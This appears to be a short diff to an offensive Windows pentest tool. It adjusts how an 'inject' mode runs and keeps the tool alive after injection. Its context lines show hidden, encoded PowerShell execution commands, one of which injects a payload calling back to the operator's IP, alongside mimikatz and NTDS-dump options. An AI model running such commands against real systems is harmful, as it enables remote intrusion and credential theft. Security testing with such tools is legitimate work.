@@ -2560,6 +2560,7 @@ def connect(host):
                 args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
 
             if args.inject:
+                noOutput = True
                 args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(inject_pscommand(local_ip))
 
             if args.command:
@@ -2771,7 +2772,7 @@ if __name__ == '__main__':
 
     concurrency(hosts)
 
-    if args.mimikatz or args.ntds == 'ninja':
+    if args.mimikatz or args.inject or args.ntds == 'ninja':
         try:
             while True:
                 sleep(1)
